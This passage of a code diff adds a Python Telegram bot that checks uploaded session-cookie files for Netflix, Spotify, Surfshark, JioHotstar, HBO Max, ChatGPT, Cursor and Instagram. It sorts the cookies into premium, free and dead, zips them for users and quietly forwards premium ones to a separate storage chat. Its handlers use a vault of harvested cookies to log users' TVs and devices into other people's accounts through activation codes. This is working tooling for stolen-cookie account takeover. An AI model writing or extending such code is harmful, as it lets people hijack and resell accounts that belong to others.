+               f"{CUR_DEAD} Dead  : <b>{len(dead)}</b>\n"
+               f"{E_COUNT} Total : <b>{total}</b>")
+        await bot.send_document(chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"cursor_results_{ts}.zip"),
+            caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+    elif mode == "instagram":
+        live = r["ig_live"]; dead = r["ig_dead"]; total = r["ig_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No Instagram results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for idx, hit in enumerate(live, 1):
+                user_slug = re.sub(r"[^\w\-_]", "_", hit.get("username", f"user_{idx}"))
+                zf.writestr(f"live/{user_slug}.txt", hit.get("content", ""))
+        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+        cap = (f"{E_ZIP} <b>Instagram Results — {ts}</b>\n\n"
+               f"{IG_LIVE} Live  : <b>{len(live)}</b>\n"
+               f"{IG_DEAD} Dead  : <b>{len(dead)}</b>\n"
+               f"{E_COUNT} Total : <b>{total}</b>")
+        await bot.send_document(chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"instagram_results_{ts}.zip"),
+            caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+    else:  # scan
+        live = r["scan_live"]; dead = r["scan_dead"]; total = r["scan_total"]
+        if not total:
+            await bot.send_message(chat_id, f"{E_EMPTY} No Scanner results yet.", parse_mode="HTML", reply_markup=main_markup(mode))
+            return
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for idx, hit in enumerate(live, 1):
+                srv = hit.get("service", "unknown")
+                content = hit.get("content", "")
+                zf.writestr(f"{srv}/hit_{idx}.txt", content)
+        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+        cap = (f"{E_ZIP} <b>Scanner Results — {ts}</b>\n\n"
+               f"{SCAN_LIVE} Live  : <b>{len(live)}</b>\n"
+               f"{SCAN_DEAD} Dead  : <b>{len(dead)}</b>\n"
+               f"{E_COUNT} Total : <b>{total}</b>")
+        await bot.send_document(chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"scan_results_{ts}.zip"),
+            caption=cap, parse_mode="HTML", reply_markup=main_markup(mode))
+
+
+async def _send_stats(chat_id, uid, bot: Bot):
+    r    = user_results[uid]
+    mode = r["mode"]
+    if mode == "surfshark":
+        premium = r["ss_premium"]; free = r["ss_free"]; dead = r["ss_dead"]; total = r["ss_total"]
+        revived = sum(1 for x in premium if x.get("revived"))
+        pct     = f"{len(premium) / total * 100:.1f}" if total else "0.0"
+        text = (f"{E_STATS} <b>Surfshark Session Stats</b>\n\n"
+                f"{E_COUNT} Checked  : <b>{total}</b>\n"
+                f"{SS_PREMIUM} Premium  : <b>{len(premium)}</b>  ({pct}%)\n"
+                f"{SS_FREE} Free     : <b>{len(free)}</b>\n"
+                f"{SS_DEAD} Dead     : <b>{len(dead)}</b>\n"
+                f"{SS_REVIVED} Revived  : <b>{revived}</b>")
+    elif mode == "spotify":
+        premium = r["sp_premium"]; free = r["sp_free"]; dead = r["sp_dead"]; total = r["sp_total"]
+        text = (f"{E_STATS}  <b>Spotify Session Stats</b>\n\n"
+                f"{SP_PREMIUM}   Premium  :  <b>{len(premium)}</b>\n"
+                f"{SP_FREE}   Free     :  <b>{len(free)}</b>\n"
+                f"{SP_DEAD}   Dead     :  <b>{len(dead)}</b>\n"
+                f"{E_COUNT}   Checked  :  <b>{total}</b>")
+    elif mode == "hotstar":
+        live = r["hs_live"]; device = r["hs_device"]; free = r["hs_free"]; invalid = r["hs_invalid"]; total = r["hs_total"]
+        pct  = f"{len(live) / total * 100:.1f}" if total else "0.0"
+        bd   = hs_plan_breakdown(live)
+        text = (f"{E_STATS} <b>Hotstar Session Stats</b>\n\n"
+                f"{E_COUNT} Checked       : <b>{total}</b>\n"
+                f"{HS_LIVE} Live          : <b>{len(live)}</b>  ({pct}%)\n"
+                f"{HS_DEVICE} Device Limit  : <b>{len(device)}</b>\n"
+                f"{HS_FREE} Free          : <b>{len(free)}</b>\n"
+                f"{HS_INVALID} Invalid       : <b>{len(invalid)}</b>\n\n"
+                f"{E_STATS} <b>Live — By Plan:</b>\n{_plan_lines(bd, '  ')}")
+    elif mode == "netflix":
+        premium = r["nf_premium"]; free_l = r["nf_free"]; dead = r["nf_dead"]
+        tokens  = r["nf_tokens"];  total  = r["nf_total"]; sub = r.get("nf_sub", "check")
+        pct     = f"{len(premium) / total * 100:.1f}" if total and sub != "nftoken" else "0.0"
+        if sub == "nftoken":
+            text = (f"{E_STATS} <b>Netflix Token Stats</b>\n\n"
+                    f"{E_COUNT}   Total   : <b>{total}</b>\n"
+                    f"{SP_CODE}   Tokens  : <b>{len(tokens)}</b>\n"
+                    f"{SP_DEAD}   Failed  : <b>{len(dead)}</b>")
+        else:
+            text = (f"{E_STATS} <b>Netflix Session Stats</b>\n\n"
+                    f"{E_COUNT}   Checked : <b>{total}</b>\n"
+                    f"{SP_PREMIUM}   Premium : <b>{len(premium)}</b>  ({pct}%)\n"
+                    f"{SP_FREE}   Free    : <b>{len(free_l)}</b>\n"
+                    f"{SP_DEAD}   Dead    : <b>{len(dead)}</b>")
+    elif mode == "hbomax":
+        live  = r["hbo_live"]; dead = r["hbo_dead"]; total = r["hbo_total"]
+        pct   = f"{len(live) / total * 100:.1f}" if total else "0.0"
+        text  = (f"{E_STATS} <b>HBO Max Session Stats</b>\n\n"
+                 f"{E_COUNT}  Checked : <b>{total}</b>\n"
+                 f"{HBO_LIVE}  Live    : <b>{len(live)}</b>  ({pct}%)\n"
+                 f"{HBO_DEAD}  Dead    : <b>{len(dead)}</b>")
+    elif mode == "chatgpt":
+        premium = r["cg_premium"]; free = r["cg_free"]; dead = r["cg_dead"]; total = r["cg_total"]
+        pct = f"{len(premium) / total * 100:.1f}" if total else "0.0"
+        text = (f"{E_STATS} <b>ChatGPT Session Stats</b>\n\n"
+                f"{E_COUNT} Total   : <b>{total}</b>\n"
+                f"{CG_PREMIUM} Premium : <b>{len(premium)}</b>  ({pct}%)\n"
+                f"{CG_FREE} Free    : <b>{len(free)}</b>\n"
+                f"{CG_DEAD} Dead    : <b>{len(dead)}</b>")
+    elif mode == "cursor":
+        pro = r["cur_pro"]; free = r["cur_free"]; dead = r["cur_dead"]; total = r["cur_total"]
+        pct = f"{len(pro) / total * 100:.1f}" if total else "0.0"
+        text = (f"{E_STATS} <b>Cursor Session Stats</b>\n\n"
+                f"{E_COUNT} Total : <b>{total}</b>\n"
+                f"{CUR_PRO} Pro   : <b>{len(pro)}</b>  ({pct}%)\n"
+                f"{CUR_FREE} Free  : <b>{len(free)}</b>\n"
+                f"{CUR_DEAD} Dead  : <b>{len(dead)}</b>")
+    elif mode == "instagram":
+        live = r["ig_live"]; dead = r["ig_dead"]; total = r["ig_total"]
+        pct  = f"{len(live) / total * 100:.1f}" if total else "0.0"
+        text = (f"{E_STATS} <b>Instagram Session Stats</b>\n\n"
+                f"{E_COUNT} Total : <b>{total}</b>\n"
+                f"{IG_LIVE} Live  : <b>{len(live)}</b>  ({pct}%)\n"
+                f"{IG_DEAD} Dead  : <b>{len(dead)}</b>")
+    else:  # scan
+        live = r["scan_live"]; dead = r["scan_dead"]; total = r["scan_total"]
+        pct  = f"{len(live) / total * 100:.1f}" if total else "0.0"
+        text = (f"{E_STATS} <b>Scanner Session Stats</b>\n\n"
+                f"{E_COUNT} Total : <b>{total}</b>\n"
+                f"{SCAN_LIVE} Live  : <b>{len(live)}</b>  ({pct}%)\n"
+                f"{SCAN_DEAD} Dead  : <b>{len(dead)}</b>")
+    await bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=main_markup(mode))
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    GC STORE                                             ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+async def _gc_store_ss(bot: Bot, premium: list):
+    if not GC_STORE_CHAT_ID or not premium:
+        return
+    try:
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for r in premium:
+                plan_slug  = re.sub(r"[^\w]", "_", r.get("plan", "Unknown"))
+                email_slug = re.sub(r"[^\w\-_]", "_", r.get("email", "unk").split("@")[0])
+                zf.writestr(f"premium/{plan_slug}/{email_slug}_{r.get('expires_at','unk')}.txt", r.get("content", ""))
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        await bot.send_document(
+            GC_STORE_CHAT_ID,
+            document=BufferedInputFile(buf.getvalue(), filename=f"ss_gc_{ts}.zip"),
+            caption=f"{E_ZIP} <b>Surfshark GC — {ts}</b>\n{SS_PREMIUM} Premium: <b>{len(premium)}</b>",
+            parse_mode="HTML",
+        )
+    except Exception as e:
+        logger.warning(f"GC ss error: {e}")
+
+
+async def _gc_store_sp(bot: Bot, premium: list):
+    if not GC_STORE_CHAT_ID or not premium:
+        return
+    tmp = tempfile.mktemp(suffix=".zip")
+    try:
+        with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zf:
+            for r in premium:
+                name = re.sub(r"[^\w\-.]", "_", r.get("filename", "cookie")) or "cookie.txt"
+                zf.writestr(name, r.get("content", ""))
+        ts = int(time.time())
+        await bot.send_document(
+            GC_STORE_CHAT_ID,
+            document=FSInputFile(tmp, filename=f"sp_gc_{ts}.zip"),
+            caption=f"{E_ZIP} <b>Spotify GC</b>\n{SP_PREMIUM} Premium: <b>{len(premium)}</b>",
+            parse_mode="HTML", disable_notification=True,
+        )
+    except Exception as e:
+        logger.warning(f"GC sp error: {e}")
+    finally:
+        try:
+            os.remove(tmp)
+        except Exception:
+            pass
+
+
+async def _gc_store_hs(bot: Bot, live, device, free):
+    if not GC_STORE_CHAT_ID or not (live or device or free):
+        return
+    try:
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            for r in live:
+                plan_slug = re.sub(r"[^\w]", "_", r.get("plan", "Unknown"))
+                zf.writestr(f"live/{plan_slug}/{r.get('name','unk')}_{r.get('expiry','unk')}.txt",
+                            hs_convert_to_netscape(r.get("cookies", {})))
+            for r in device:
+                plan_slug = re.sub(r"[^\w]", "_", r.get("plan", "Unknown"))
+                zf.writestr(f"device_limit/{plan_slug}/device_{r.get('name','unk')}.txt",
+                            hs_convert_to_netscape(r.get("cookies", {})))
+            for r in free:
+                zf.writestr(f"free/free_{r.get('name','unk')}.txt",
+                            hs_convert_to_netscape(r.get("cookies", {})))
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        await bot.send_document(
+            GC_STORE_CHAT_ID,
+            document=BufferedInputFile(buf.getvalue(), filename=f"hs_gc_{ts}.zip"),
+            caption=f"{E_ZIP} <b>Hotstar GC — {ts}</b>\n{HS_LIVE} Live: <b>{len(live)}</b>  {HS_DEVICE} Device: <b>{len(device)}</b>",
+            parse_mode="HTML",
+        )
+    except Exception as e:
+        logger.warning(f"GC hs error: {e}")
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    BOT HANDLERS                                         ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+router = Router()
+
+
+@router.message(Command("start"))
+async def cmd_start(message: types.Message):
+    uid = message.from_user.id
+    user_results[uid] = _fresh_state()
+    mode = user_results[uid]["mode"]
+    await message.answer(start_text(mode), parse_mode="HTML", reply_markup=main_markup(mode))
+
+
+@router.message(Command("stats"))
+async def cmd_stats(message: types.Message, bot: Bot):
+    uid = message.from_user.id
+    if uid not in ADMIN_IDS:
+        await message.answer(f"{E_NO} Admin only.", parse_mode="HTML")
+        return
+    ss_p = len(glob.glob("ss_premium/*.txt"))
+    ss_f = len(glob.glob("ss_free/*.txt"))
+    sp_p = len(glob.glob("sp_premium/*.txt"))
+    sp_f = len(glob.glob("sp_free/*.txt"))
+    hs_l = len(glob.glob("hs_live/*.txt"))
+    hs_d = len(glob.glob("hs_device/*.txt"))
+    cg_p = len(glob.glob("cg_premium/*.txt"))
+    cu_p = len(glob.glob("cur_pro/*.txt"))
+    ig_l = len(glob.glob("ig_live/*.txt"))
+    await message.answer(
+        f"{E_STATS} <b>Admin Disk Statistics</b>\n\n"
+        f"{SS_SHIELD} <b>Surfshark</b>\n"
+        f"  {SS_PREMIUM} Premium : <b>{ss_p}</b>  |  {SS_FREE} Free : <b>{ss_f}</b>\n\n"
+        f"{SP_MUSIC} <b>Spotify</b>\n"
+        f"  {SP_PREMIUM} Premium : <b>{sp_p}</b>  |  {SP_FREE} Free : <b>{sp_f}</b>\n\n"
+        f"{HS_TARGET} <b>JioHotstar</b>\n"
+        f"  {HS_LIVE} Live : <b>{hs_l}</b>  |  {HS_DEVICE} Device : <b>{hs_d}</b>\n\n"
+        f"{CG_EMOJI} <b>ChatGPT</b>  |  {CUR_EMOJI} <b>Cursor</b>\n"
+        f"  {CG_PREMIUM} ChatGPT : <b>{cg_p}</b>  |  {CUR_PRO} Cursor : <b>{cu_p}</b>\n\n"
+        f"{IG_EMOJI} <b>Instagram</b>  |  {SCAN_EMOJI} <b>Scanner</b>\n"
+        f"  {IG_LIVE} Instagram : <b>{ig_l}</b>",
+        parse_mode="HTML",
+    )
+
+
+@router.callback_query()
+async def button_callback(callback: types.CallbackQuery, bot: Bot):
+    await callback.answer()
+    uid     = callback.from_user.id
+    data    = callback.data
+    chat_id = callback.message.chat.id
+    r       = user_results[uid]
+    mode    = r["mode"]
+
+    # ── Mode switching ───────────────────────────────────────────────────────
+    if data == "switch_service":
+        await bot.send_message(
+            chat_id, f"{E_WRENCH} <b>Select a service to check:</b>",
+            parse_mode="HTML", reply_markup=_service_markup(),
+        )
+        return
+
+    if data.startswith("mode_"):
+        new_mode = data[5:]
+        user_results[uid]["mode"] = new_mode
+        await bot.send_message(
+            chat_id, f"✅ Switched to <b>{SERVICES[new_mode]}</b>.\nSend a cookie file to begin.",
+            parse_mode="HTML", reply_markup=main_markup(new_mode),
+        )
+        return
+
+    # ── Common actions ───────────────────────────────────────────────────────
+    if data == "get_results":
+        await _send_zip(chat_id, uid, bot)
+    elif data == "view_stats":
+        await _send_stats(chat_id, uid, bot)
+    elif data == "clear_all":
+        cur_mode = user_results[uid]["mode"]
+        user_results[uid] = _fresh_state()
+        user_results[uid]["mode"] = cur_mode
+        await bot.send_message(
+            chat_id, f"{E_TRASH} <b>Results cleared.</b>\nSend another file to start fresh.",
+            parse_mode="HTML", reply_markup=main_markup(cur_mode),
+        )
+    elif data == "format_help":
+        await bot.send_message(
+            chat_id, FORMAT_TEXTS.get(mode, "No format guide for this service."),
+            parse_mode="HTML", reply_markup=main_markup(mode),
+        )
+
+    # ── Surfshark: device login ──────────────────────────────────────────────
+    elif data == "ss_login_device":
+        premium = r["ss_premium"]
+        if not premium:
+            await bot.send_message(chat_id,
+                f"{SS_DEAD} <b>No Surfshark premium cookies.</b>\nCheck some first.",
+                parse_mode="HTML", reply_markup=main_markup("surfshark"))
+            return
+        best = max(premium, key=lambda x: x.get("days_left", 0))
+        user_results[uid]["ss_awaiting_code"] = True
+        user_results[uid]["ss_login_data"]    = {
+            "content": best.get("content", ""), "sstk": best.get("sstk", ""),
+            "email": best.get("email", "Unknown"), "plan": best.get("plan", "Unknown"),
+            "expires_at": best.get("expires_at", "Unknown"), "days_left": best.get("days_left", 0),
+        }
+        await bot.send_message(
+            chat_id,
+            f"╔═══════════════════════════╗\n"
+            f"║  {SS_LOGIN} <b>Surfshark Device Login</b>  ║\n"
+            f"╚═══════════════════════════╝\n\n"
+            f"{E_EMAIL}  <b>Account :</b> <code>{best.get('email','Unknown')}</code>\n"
+            f"{E_PLAN}  <b>Plan    :</b> <code>{best.get('plan','Unknown')}</code>\n"
+            f"{E_CLOCK}  <b>Days    :</b> <code>{best.get('days_left','?')} days left</code>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{HS_PHONE} Open <b>Surfshark app</b> → Tap <b>Login on another device</b>\n"
+            f"→ Enter the <b>6-digit code</b> here 👇",
+            parse_mode="HTML", reply_markup=_ss_cancel_markup(),
+        )
+    elif data == "ss_cancel_login":
+        user_results[uid]["ss_awaiting_code"] = False
+        user_results[uid]["ss_login_data"]    = None
+        await bot.send_message(chat_id, f"{E_TRASH} Login cancelled.",
+                               parse_mode="HTML", reply_markup=main_markup("surfshark"))
+
+    # ── Spotify: TV activation ───────────────────────────────────────────────
+    elif data == "sp_activate_tv":
+        premium = r["sp_premium"]
+        if not premium:
+            await bot.send_message(chat_id,
+                f"{SP_DEAD}  <b>No Spotify premium cookies.</b>\nCheck some first.",
+                parse_mode="HTML", reply_markup=main_markup("spotify"))
+            return
+        best = premium[0]
+        user_results[uid]["sp_awaiting_tv"] = True
+        user_results[uid]["sp_tv_data"]     = {
+            "cookies": best.get("cookies", {}), "email": best.get("email", "Unknown"),
+            "plan": best.get("plan", "Unknown"), "country": best.get("country", "Unknown"),
+        }
+        await bot.send_message(
+            chat_id, sp_fmt_tv_ready(best.get("email","?"), best.get("plan","?"), best.get("country","?")),
+            parse_mode="HTML", reply_markup=_sp_cancel_markup(),
+        )
+    elif data == "sp_cancel_tv":
+        user_results[uid]["sp_awaiting_tv"] = False
+        user_results[uid]["sp_tv_data"]     = None
+        await bot.send_message(chat_id, f"{E_TRASH}  TV activation cancelled.",
+                               parse_mode="HTML", reply_markup=main_markup("spotify"))
+
+    # ── JioHotstar: QR TV activation ────────────────────────────────────────
+    elif data == "hs_activate_qr":
+        total_v = hs_vault_count()
+        avail_v = hs_vault_available_count()
+        if avail_v == 0:
+            await bot.send_message(
+                chat_id,
+                f"{HS_INVALID} <b>No vault cookies available.</b>\n\n"
+                f"Total in vault: <b>{total_v}</b>  |  Available: <b>0</b>\n\n"
+                f"Ask an admin to upload more via <b>{E_UPLOAD} Upload Vault</b>.",
+                parse_mode="HTML", reply_markup=main_markup("hotstar"),
+            )
+            return
+        user_results[uid]["hs_awaiting_qr"] = True
+        await bot.send_message(
+            chat_id,
+            f"╔════════════════════════════╗\n"
+            f"║  {HS_TV} <b>JioHotstar QR Activator</b>  ║\n"
+            f"╚════════════════════════════╝\n\n"
+            f"{HS_LIVE} Vault ready: <b>{avail_v}</b> account(s) available\n\n"
+            f"{E_CAMERA} <b>Send a photo of your JioHotstar QR code</b>\n"
+            f"<i>(The QR shown on your TV's login screen)</i>",
+            parse_mode="HTML", reply_markup=_hs_qr_cancel_markup(),
+        )
+
+    elif data == "hs_cancel_qr":
+        user_results[uid]["hs_awaiting_qr"] = False
+        await bot.send_message(chat_id, f"{E_TRASH} QR activation cancelled.",
+                               parse_mode="HTML", reply_markup=main_markup("hotstar"))
+
+    elif data == "hs_vault_upload":
+        if uid not in ADMIN_IDS and uid != OWNER_ID:
+            await bot.send_message(chat_id, f"{E_NO} <b>Admins only.</b>",
+                                   parse_mode="HTML", reply_markup=main_markup("hotstar"))
+            return
+        user_results[uid]["hs_vault_upload"] = True
+        await bot.send_message(
+            chat_id,
+            f"{E_UPLOAD} <b>Upload Vault Cookies</b>\n\n"
+            f"Send a <code>.zip</code> file containing <code>.txt</code> Netscape-format "
+            f"JioHotstar cookie files.\n\n"
+            f"Current vault: <b>{hs_vault_count()}</b> total  |  "
+            f"<b>{hs_vault_available_count()}</b> available  "
+            f"(max {HS_VAULT_MAX_USES} uses each)",
+            parse_mode="HTML", reply_markup=_hs_vault_cancel_markup(),
+        )
+
+    elif data == "hs_cancel_vault_upload":
+        user_results[uid]["hs_vault_upload"] = False
+        await bot.send_message(chat_id, f"{E_TRASH} Vault upload cancelled.",
+                               parse_mode="HTML", reply_markup=main_markup("hotstar"))
+
+    # ── Netflix: sub-mode switching ──────────────────────────────────────────
+    elif data.startswith("nf_sub_"):
+        sub = data[7:]
+        user_results[uid]["nf_sub"] = sub
+        labels = {
+            "check":   "🔍 Account Check — send a cookie file to check.",
+            "nftoken": "🔑 NF Token — send a cookie file to generate tokens.",
+            "clean":   "🧹 Clean Cookies — send a file; get back a deduplicated ZIP.",
+            "tvlogin": "📺 TV Login — enter the 8-digit code shown on your TV.",
+        }
+        await bot.send_message(chat_id,
+            f"{SP_BOLT} <b>Netflix mode: {labels.get(sub,'?')}</b>",
+            parse_mode="HTML", reply_markup=main_markup("netflix"))
+        if sub == "tvlogin":
+            user_results[uid]["nf_awaiting_tv"] = True
+            await bot.send_message(chat_id,
+                f"╔══════════════════════════╗\n"
+                f"║  {SP_TV} <b>Netflix TV Login</b>     ║\n"
+                f"╚══════════════════════════╝\n\n"
+                f"{SP_BOLT} Vault: <b>{nf_vault_count()}</b> cookie(s) available\n\n"
+                f"📺 On your TV: <b>Settings → Sign in → Get a code</b>\n\n"
+                f"→ Type the <b>8-digit code</b> here 👇",
+                parse_mode="HTML", reply_markup=_nf_tv_cancel_markup())
+
+    elif data == "nf_cancel_tv":
+        user_results[uid]["nf_awaiting_tv"] = False
+        await bot.send_message(chat_id, f"{E_TRASH} TV login cancelled.",
+                               parse_mode="HTML", reply_markup=main_markup("netflix"))
+
+    elif data == "nf_vault_upload":
+        if uid not in ADMIN_IDS and uid != OWNER_ID:
+            await bot.send_message(chat_id, f"{E_NO} <b>Admins only.</b>",
+                                   parse_mode="HTML", reply_markup=main_markup("netflix"))
+            return
+        user_results[uid]["nf_vault_upload"] = True
+        await bot.send_message(chat_id,
+            f"{E_UPLOAD} <b>Upload Netflix TV Vault</b>\n\n"
+            f"Send a <code>.zip</code> containing Netflix cookie files.\n"
+            f"Each file is consumed once (one-time use).\n\n"
+            f"Current vault: <b>{nf_vault_count()}</b> cookie(s)",
+            parse_mode="HTML", reply_markup=_nf_vault_cancel_markup())
+
+    elif data == "nf_cancel_vault_upload":
+        user_results[uid]["nf_vault_upload"] = False
+        await bot.send_message(chat_id, f"{E_TRASH} Vault upload cancelled.",
+                               parse_mode="HTML", reply_markup=main_markup("netflix"))
+
+    # ── HBO Max: TV activation ───────────────────────────────────────────────
+    elif data == "hbo_activate_tv":
+        live = r["hbo_live"]
+        if not live:
+            await bot.send_message(chat_id,
+                f"{HBO_DEAD} <b>No live HBO Max cookies checked yet.</b>\n\n"
+                f"Send a cookie file first, then tap <b>{HBO_TV} Activate TV</b>.",
+                parse_mode="HTML", reply_markup=main_markup("hbomax"))
+            return
+        best = live[0]
+        user_results[uid]["hbo_awaiting_tv"] = True
+        user_results[uid]["hbo_tv_data"]     = {
+            "st_token": best.get("st_token", ""), "region": best.get("region", "amer"),
+            "email": best.get("email", "Unknown"), "country": best.get("country", "Unknown"),
+        }
+        await bot.send_message(
+            chat_id,
+            f"╔══════════════════════════════╗\n"
+            f"║  {HBO_TV} <b>HBO Max TV Activator</b>     ║\n"
+            f"╚══════════════════════════════╝\n\n"
+            f"{E_EMAIL}  <b>Account :</b> <code>{best.get('email','Unknown')}</code>\n"
+            f"{E_COUNTRY}  <b>Country :</b> <code>{best.get('country','Unknown')}</code>\n"
+            f"{E_PLAN}  <b>Region  :</b> <code>{best.get('region','?').upper()}</code>\n\n"
+            f"📺 On your TV: go to <b>hbomax.com/tvsignin</b>\n"
+            f"→ Enter the <b>6-digit code</b> shown on screen 👇",
+            parse_mode="HTML", reply_markup=_hbo_cancel_markup(),
+        )
+
+    elif data == "hbo_cancel_tv":
+        user_results[uid]["hbo_awaiting_tv"] = False
+        user_results[uid]["hbo_tv_data"]     = None
+        await bot.send_message(chat_id, f"{E_TRASH} TV activation cancelled.",
+                               parse_mode="HTML", reply_markup=main_markup("hbomax"))
+
+
+@router.message(F.text & ~F.command)
+async def handle_text(message: types.Message):
+    uid  = message.from_user.id
+    text = message.text.strip()
+    r    = user_results[uid]
+    mode = r["mode"]
+
+    if r.get("ss_awaiting_code"):
+        code = text.upper()
+        if len(code) != 6 or not code.isalnum():
+            await message.answer(
+                f"{SS_DEAD} Enter the <b>6-character code</b> from Surfshark app.",
+                parse_mode="HTML", reply_markup=_ss_cancel_markup(),
+            )
+            return
+        login_data = r.get("ss_login_data", {})
+        msg = await message.answer(f"{E_GEAR} <b>Authorizing device…</b>", parse_mode="HTML")
+        loop = asyncio.get_event_loop()
+        success, err_msg = await loop.run_in_executor(
+            None, ss_authorize_device,
+            login_data.get("content", ""), login_data.get("sstk", ""), code,
+        )
+        user_results[uid]["ss_awaiting_code"] = False
+        user_results[uid]["ss_login_data"]    = None
+        if success:
+            await safe_edit(msg,
+                f"╔═══════════════════════════╗\n"
+                f"║  {E_CHECK} <b>DEVICE AUTHORIZED!</b>     ║\n"
+                f"╚═══════════════════════════╝\n\n"
+                f"{E_EMAIL}  <b>Account :</b> <code>{login_data.get('email','?')}</code>\n"
+                f"{E_PLAN}  <b>Plan    :</b> <code>{login_data.get('plan','?')}</code>\n"
+                f"{E_CLOCK}  <b>Days    :</b> <code>{login_data.get('days_left','?')} days left</code>\n\n"
+                f"<i>Open Surfshark — you're connected! ✅</i>",
+                markup=main_markup("surfshark"),
+            )
+        else:
+            await safe_edit(msg,
+                f"{SS_DEAD} <b>Authorization failed.</b>\n<code>{err_msg}</code>\n\n"
+                f"Get a fresh code and tap <b>🔑 Login Device</b>.",
+                markup=main_markup("surfshark"),
+            )
+        return
+
+    if r.get("sp_awaiting_tv"):
+        code = text.upper()
+        if len(code) != 6 or not code.isalnum():
+            await message.answer(
+                f"{SP_DEAD}  Enter the <b>6-character code</b> shown on your TV.",
+                parse_mode="HTML", reply_markup=_sp_cancel_markup(),
+            )
+            return
+        tv_data = r.get("sp_tv_data", {})
+        msg     = await message.answer(f"{SP_SEARCH}  <b>Fetching tokens…</b>", parse_mode="HTML")
+        loop    = asyncio.get_event_loop()
+        csrf, flow, upd_cookies = await loop.run_in_executor(
+            None, sp_get_csrf_and_flow, tv_data.get("cookies", {}),
+        )
+        if not csrf or not flow:
+            user_results[uid]["sp_awaiting_tv"] = False
+            user_results[uid]["sp_tv_data"]     = None
+            await safe_edit(msg,
+                f"{SP_DEAD}  <b>Failed to get tokens.</b>\nCookie may be expired.",
+                markup=main_markup("spotify"),
+            )
+            return
+        await safe_edit(msg, f"{SP_BOLT}  <b>Activating TV…</b>")
+        success, tv_name, err_msg = await loop.run_in_executor(
+            None, sp_activate_tv, upd_cookies, code, csrf, flow,
+        )
+        user_results[uid]["sp_awaiting_tv"] = False
+        user_results[uid]["sp_tv_data"]     = None
+        if success:
+            await safe_edit(msg,
+                sp_fmt_tv_success(tv_name or "Unknown Device", code,
+                                  tv_data.get("email","?"), tv_data.get("plan","?"), tv_data.get("country","?")),
+                markup=main_markup("spotify"),
+            )
+        else:
+            await safe_edit(msg,
+                f"{SP_DEAD}  <b>Activation failed.</b>\n<code>{err_msg}</code>\n\nGet a fresh code and tap <b>{SP_TV} Activate TV</b>.",
+                markup=main_markup("spotify"),
+            )
+        return
+
+    if r.get("nf_awaiting_tv") and mode == "netflix":
+        code = text.strip().replace(" ", "").replace("-", "")
+        if not re.match(r"^\d{6,8}$", code):
+            await message.answer(
+                f"{SP_DEAD} <b>Invalid code.</b>\nExpected a 6-8 digit number (e.g. <code>12345678</code>).",
+                parse_mode="HTML", reply_markup=_nf_tv_cancel_markup())
+            return
+        user_results[uid]["nf_awaiting_tv"] = False
+        msg  = await message.answer(
+            f"{SP_BOLT}  <b>Trying code <code>{code}</code> with vault cookies…</b>",
+            parse_mode="HTML")
+        loop = asyncio.get_event_loop()
+        res  = await loop.run_in_executor(None, nf_process_tv_login, code)
+        if res.get("success"):
+            await safe_edit(msg,
+                f"╔══════════════════════════════╗\n"
+                f"║  {SP_PREMIUM} <b>Netflix TV Activated!</b>  ║\n"
+                f"╚══════════════════════════════╝\n\n"
+                f"{E_COUNTRY}  Country : <code>{res.get('country','Unknown')}</code>\n"
+                f"{E_PLAN}  Plan    : <code>{res.get('plan','Unknown')}</code>\n"
+                f"{E_COUNT}  Tried   : <code>{res.get('tried',1)}</code> account(s)\n\n"
+                f"<i>{SP_SPARK} Your TV should now be logged in.</i>",
+                markup=main_markup("netflix"))
+        else:
+            err = res.get("error", "Unknown error")
+            if err == "no_cookies_left":
+                err_msg = "No vault cookies available. Ask an admin to upload more."
+            elif err == "all_cookies_failed":
+                err_msg = f"Tried {res.get('tried',0)} account(s) — all invalid or expired."
+            else:
+                err_msg = err
+            await safe_edit(msg,
+                f"{SP_DEAD}  <b>TV Login Failed</b>\n\n"
+                f"<code>{err_msg}</code>\n\n"
+                f"Make sure the code on screen hasn't expired, then try again.",
+                markup=main_markup("netflix"))
+        return
+
+    if r.get("hbo_awaiting_tv") and mode == "hbomax":
+        code = text.strip().upper().replace(" ", "").replace("-", "")
+        if not re.match(r"^\d{6}$", code):
+            await message.answer(
+                f"{HBO_DEAD} Enter the <b>6-digit code</b> shown on your TV screen.",
+                parse_mode="HTML", reply_markup=_hbo_cancel_markup(),
+            )
+            return
+        tv_data = r.get("hbo_tv_data", {})
+        user_results[uid]["hbo_awaiting_tv"] = False
+        user_results[uid]["hbo_tv_data"]     = None
+        msg = await message.answer(f"{E_GEAR} <b>Activating TV…</b>", parse_mode="HTML")
+        loop = asyncio.get_event_loop()
+        success, status = await loop.run_in_executor(
+            None, hbo_activate_tv,
+            tv_data.get("st_token", ""), code, tv_data.get("region", "amer"),
+        )
+        if success:
+            await safe_edit(msg,
+                f"╔══════════════════════════════╗\n"
+                f"║  {E_CHECK} <b>HBO Max TV Activated!</b>   ║\n"
+                f"╚══════════════════════════════╝\n\n"
+                f"{E_EMAIL}  <b>Account :</b> <code>{tv_data.get('email','?')}</code>\n"
+                f"{E_COUNTRY}  <b>Country :</b> <code>{tv_data.get('country','?')}</code>\n"
